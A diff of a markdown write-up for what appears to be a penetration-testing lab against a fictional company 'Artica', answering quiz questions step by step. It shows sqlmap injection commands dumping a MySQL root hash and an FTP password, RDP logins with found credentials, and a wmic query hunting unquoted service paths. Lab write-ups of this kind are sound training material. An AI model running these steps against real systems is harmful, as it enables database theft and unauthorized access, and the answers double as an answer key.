@@ -25,7 +25,7 @@
 ## Question 2: What version of Apache is Artica's intranet using?
 - We scan all available hosts, because it is not clear which one is providing the internal web service
 - `curl --head http://10.102.X.Y`
-- Result: Host 4 has **Apache/2.4.29** running
+- Result: On Host 4 **Apache/2.4.29** is running
 
 #### Scans
 
@@ -55,14 +55,14 @@
 #### Approach
 
 - We start scanning Host 4 for vulnerabilities: `nmap -p80 --script=vuln 10.102.11.66`
-- Result: It seems no obvious DOM based XSS or stored XSS vulnerability is exisiting
+- Result: It seems there is no obvious DOM based XSS or stored XSS vulnerability exisiting
 - Further, after analyzing the website we can confirm there is no input field available, i.e. no file upload mechanism
 - The leftover option seems SQL Injection, so we follow this track ...
 - A first hint: the single `'` forces an internal error
 
 ![grafik](https://user-images.githubusercontent.com/84674087/132576273-8a63dcb4-e42c-4159-8c71-4f4743c8682b.png)
 
-- We start Burpsuite and capture the GET request from the only webpage with client interaction, i.e. with parameter transfer
+- We start Burpsuite and capture the GET request from the only subdirectory with client interaction, i.e. with parameter transfer
 
 ![grafik](https://user-images.githubusercontent.com/84674087/132576664-df8ce7bd-c71c-4958-a4bb-6f0d039252ef.png)
 
@@ -85,18 +85,24 @@
 ![grafik](https://user-images.githubusercontent.com/84674087/132577174-5328591e-90e2-4c29-8b2a-1faf500a0de1.png)
 
 - We dump users from mysql and receive the mysql password hash from root !
-- `sqlmap -r req.txt -p “to” -D mysql -T user --dump`: **root@localhost : *5A33F8157E73ADDBC5AE8B8C49C55F770465A270**
+- `sqlmap -r req.txt -p “to” -D mysql -T user --dump`: **root@localhost : \*5A33F8157E73ADDBC5AE8B8C49C55F770465A270**
 
 ## Question 4: What is the username of the FTP account that can be found in the intranet database?
 
 - `sqlmap -r req.txt -p “to” -D artica -T windows_directory --dump`
 - Result: **artica-ftp-acc: 0912jgf93FSnjf**
 
-## Question 5: Which of the following tdirectories exists on the FTP server?
+![grafik](https://user-images.githubusercontent.com/84674087/132580363-cb22f252-5f58-40fb-b7a6-e7930fbfca20.png)
+
+
+## Question 5: Which of the following directories exists on the FTP server?
+
+**Answer Options**
+
 1. Tools
 2. Compliance
 3. FTPROOT
-4. ADMIN-FILES?
+4. ADMIN-FILES
 
 #### Approach
 - `ftp -v 10.102.5.21 21`
@@ -113,8 +119,8 @@
 
 ## Question 7: What is the name of the domain Unknown Host 2 is connected to?
 
-- Tools like nbtscan, rpcclient or rdesktop did not show success
-- Instead, nmap helped out thanks to its scripts
+- Tools like nbtscan, rpcclient or rdesktop do not show success
+- Instead, nmap helps out with its scripts
 - `nmap --script=rdp* -p3389 -T4 10.102.8.99`
 - Result: **artica.office**
 
@@ -134,3 +140,39 @@
 
 ## Question 9: What type of attack is the fax server vulnerable to?
 
+#### Answer Options
+1. Unquoted service path
+2. DLL Hijacking
+3. CVE-2019-07-08
+
+#### Approach
+- CVE-2019-07-08 is a RDP RCE vulnerability
+- Unquoted service path: 
+   - Exp: C:\program files\hello.exe
+   - Windows API interpret two possible paths:
+      -  `C:\program.exe`
+      -  `C:\program files\hello.exe`
+      -  ...and then executes both of them
+      -  This can lead to a security problem if a malicious executable is placed before space (POE possible)
+- Let us start with examinig the fax server more deeply
+- We logon via FTP and go through each directory
+- There is an interesting file under `System Administration` which draws our attention:  fax-server-info.pdf
+- We download it: `get fax-server-info.pdf` 
+- To read it correctly we have to type `binary` beforehand to NOT download in ASCII mode. Then we take a look
+
+![grafik](https://user-images.githubusercontent.com/84674087/132581622-a29678c9-aca0-40ca-a781-b607bb5bc72d.png)
+
+![grafik](https://user-images.githubusercontent.com/84674087/132581644-f834dc7e-bf39-4326-9488-7c9832b6251c.png)
+
+- We found credentials for the "custom logging windows service" a.k.a remote desktop
+- `rdesktop -u artica\fax_acc 10.102.3.34:3389`
+- However, rdesktop is not working due to NLA protection (Network Level Authentication)
+- We search on the internet how to circumvent this issue and find the alternative tool xfreerdp!
+- `xfreerdp /u:"artica\fax_acc"  /v:10.102.3.34:3389`: It works!
+
+![grafik](https://user-images.githubusercontent.com/84674087/132582340-53152dfe-fe21-4e07-b110-68912ab74e39.png)
+
+- After logon to Host 2 we cosnider to look after the unqutoed service path vulnerability. For that we search the internet for more details ... 
+- And here we go: [https://pentestlab.blog/2017/03/09/unquoted-service-path/](https://pentestlab.blog/2017/03/09/unquoted-service-path/)
+    -  We open CMD on Host 2 and enter: `wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””`
+    -  Then we start services.msc and look for the name of service and check the process owner
